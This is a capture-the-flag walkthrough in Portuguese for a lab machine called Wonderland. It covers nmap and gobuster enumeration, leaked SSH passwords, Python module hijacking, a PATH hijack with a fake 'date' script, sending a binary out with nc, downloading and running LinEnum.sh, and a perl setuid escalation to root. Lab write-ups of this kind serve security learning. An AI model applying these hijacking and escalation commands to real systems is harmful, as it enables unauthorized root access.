# Wonderland
</br>
nmap -n -T4 -sCV 10.10.204.123
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/4792115a-e5d0-4093-9825-262323aa153e)
</br>
Temos duas portas abertas 22(ssh) e 80(http), ja podemos identificar que precisamos descobrir uma credencial para ter acesso a porta ssh. Vamos enumerar o HTTP.
</br>
10.10.204.123
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/f4b6910e-a8e4-4882-9038-fb73ad0359da)
</br>
Logo após vou rodar um goBuster para descobrir os diretórios.
</br>
gobuster dir -u 10.10.204.123 -w /usr/share/wordlists/dirb/common.txt
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/e18bab1b-a12d-45e1-be09-de9fb7114414)
</br>
Descobrimos um repositório chamado /r, vamos acessar ele...
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/9a0a0970-3b08-4321-818c-a80b199df5f6)
</br>
O repositório só me mostrou uma mensagem dizendo para continuar enumerando, vou rodar outro gobuster mas adicionando /r no final.
</br>
gobuster dir -u 10.10.204.123/r -w /usr/share/wordlists/dirb/common.txt
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/d0425998-ca14-4855-b40f-95fee0208740)
</br>
Ele me trouxe um repositório /a, vou tentar acesso a ele...
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/1b7936b1-07a3-4e7b-945e-468ce0936029)
</br>
Ele me retornou uma página com uma mensagem para continuar enumerando, vou rodar outro gobuster mas adicionando /a no final.
</br>
gobuster dir -u 10.10.204.123/r/a -w /usr/share/wordlists/dirb/common.txt
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/613a1753-7c84-40cc-8ef0-8b125254240a)
</br>
Ele me trouxe um repositório /b, percebi que ele tinha criado vários repositórios que no final aparece o nome do Coelho(Rabbit).
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/6c1f0de5-ab98-43d7-99ce-454e6c77b15f)
</br>
Passei letra por letra até completar o nome e as páginas são iguais com exceção da última.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/4158373b-e27d-4bbd-b597-dd464951a150)
</br>
Só que não tem nada de interessante nesta página só um texto e uma imagem. Então decidi passar página por página utilizando view-source: na url para verificar o código-fonte e identifiquei na última página as credenciais SSH.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/e6a5d37c-abff-4b23-8bb4-1d7cb1f30de6)
</br>
alice:HowDothTheLittleCrocodileImproveHisShiningTail
</br>
ssh alice@10.10.204.123
</br>
Utilizei o ls -la para verificar o diretórios e encontrei dois arquivos importantes root.txt(sem acesso) e walrus_and_the_carpenter.py
</br>
Acessei com sudo -l para conseguir ler o arquivo e nele tinha um poema e uma função que separava 10 versos aleatórios. Elas estavam sendo armazenadas em uma biblioteca chamada random.
</br>
python3 -c 'import sys; print (sys.path)'
</br>
Descobri também que o arquivo percorre todos os diretórios até encontrar a biblioteca.
</br>
Então criei um arquivo aleatório chamado random.py e coloquei o seguinte código.
</br>
import os
os.system("/bin/bash")
</br>
E logo em seguida executei o script para verificar se minha teoria estava certa.
</br>
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</br>
E conseguimos acesso a outro usuário.
</br>
Verifiquei o diretório do usuário Rabbit e contem um diretório teaParty com acesso root.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/ac4d29e4-6b3a-4003-9290-46efc8eb1f15)
</br>
Acessei o diretório ./teaParty e ele me deu data e horário. Testei novamente e ele me mostrou a mesma data só que o horário diferente. Pesquisei em blogs e tive que executar alguns códigos para descobrir esta brecha de tarefas.
</br>
Na minha máquina executei um ouvinte:
</br>
nc -lvnp 4444
</br>
E na máquina com o SSH:
</br>
nc 10.10.133.10 4444 < teaParty
</br>
Esperei um tempo e encerrei o ouvinte e utilizei o ghidra para descompilar e verificar o que houve.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/6099e05a-a472-4e94-8d6f-9c76a132ff1a)
</br>
Se tratava de um script com automação de data e hora.
</br>
Criei um arquivo date com o seguinte código para ele confundir e executar meu código.
</br>
#!/bin/bash
</br>
/bin/bash
</br>
Depois confirmei se meu arquivo estava funcionando com seguintes códigos:
</br>
export PATH=/tmp:$PATH
echo $PATH
</br>
Agora vou executar o ./teaParty novamente e consegui um escalação de privilégio para o usuário Hatter.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/06a7aae5-14ff-4c14-a907-85d0c0a70d0a)
</br>
Descobrimos uma senha.
</br>
WhyIsARavenLikeAWritingDesk?
</br>
Após esse ponto eu não tinha mais noção do que fazer pois passei por todos personagens do filme e então dei uma pesquisada e o LinEnum.sh ajuda a enumerar mais a fundo. Em uma pesquisa que eu fiz me mostraram que eu deveria executar os seguintes comandos
</br>
wget http://10.10.204.123:6969/LinEnum.sh
chmod +x LinEnum. eh
./LinEnum. eh
</br>
Obtemos root utilizando o perl com os códigos deste repositório abaixo:
</br>
https://gtfobins.github.io/gtfobins/perl/#capabilities
</br>
$(which perl) -e ‘use POSIX qw(setuid); POSIX::setuid(0); exec “/bin/sh”;’
</br>
Finalmente conseguimos o acesso root e vamos pegar a última bandeira.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/7ef41afd-57e7-4023-b88a-7f5fb183d866)


